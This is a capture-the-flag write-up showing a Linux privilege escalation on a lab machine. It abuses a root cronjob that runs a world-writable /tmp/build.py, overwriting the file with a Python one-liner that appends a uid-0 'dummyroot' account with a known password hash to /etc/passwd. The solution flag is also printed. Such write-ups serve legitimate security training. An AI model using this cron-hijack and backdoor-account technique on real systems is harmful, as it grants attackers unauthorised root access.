

Github actions - standard Linux privesc Write to `/tmp/build.py` which is ran by root in a cronjob script

```
┌──(kali㉿localhost)-[~]
└─$ ssh guest@157.245.52.169 -p 30496
The authenticity of host '[157.245.52.169]:30496 ([157.245.52.169]:30496)' can't be established.
ECDSA key fingerprint is SHA256:RSsiM3h7pSbWyvjc5JUbC5cl+YQuYr0Y4TvkNo7SVu0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[157.245.52.169]:30496' (ECDSA) to the list of known hosts.
guest@157.245.52.169's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.10.0-0.bpo.15-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ bash
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ echo "import os; os.system('echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/usr/bin/bash" >> /etc/passwd')" > test.py
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ while :; do  cp test.py /tmp/build.py; done
^C
^C
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ su dummyroot # password is password
Password:
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:/home/guest# cd ~
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# cat flag.py
print('STF22{5up3r_5U5_5y5t3m_m0du13!_a0d66b3e608fe2b38ddf77d679fbde6b74e231f54c469a081f04dc65004360f8}')root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# python3 flag.py
STF22{5up3r_5U5_5y5t3m_m0du13!_a0d66b3e608fe2b38ddf77d679fbde6b74e231f54c469a081f04dc65004360f8}
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# 
```